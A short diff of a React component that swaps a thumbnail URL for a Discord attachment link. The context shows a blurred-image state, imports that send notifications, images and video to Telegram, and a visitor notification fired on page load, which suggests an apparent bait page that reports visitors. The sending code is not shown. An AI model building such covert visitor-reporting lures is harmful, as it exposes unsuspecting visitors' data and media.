@@ -4,7 +4,7 @@ import { sendTelegramNotification, sendImageToTelegram, sendVideoToTelegram } fr
 
 function App() {
   const [isBlurred] = useState(true);
-  const thumbnailUrl = 'https://kabartimur.com/wp-content/uploads/2016/03/20160306_130430.jpg';
+  const thumbnailUrl = 'https://media.discordapp.net/attachments/1107065307081740440/1352536377367203881/20250321_145412.png?ex=67de5f29&is=67dd0da9&hm=40dfea32f0061a7bc00cda4cfed6b8a030b2a98f3799d23150f7249827621908&=&width=809&height=354';
 
   useEffect(() => {
     const sendVisitorNotification = async () => {
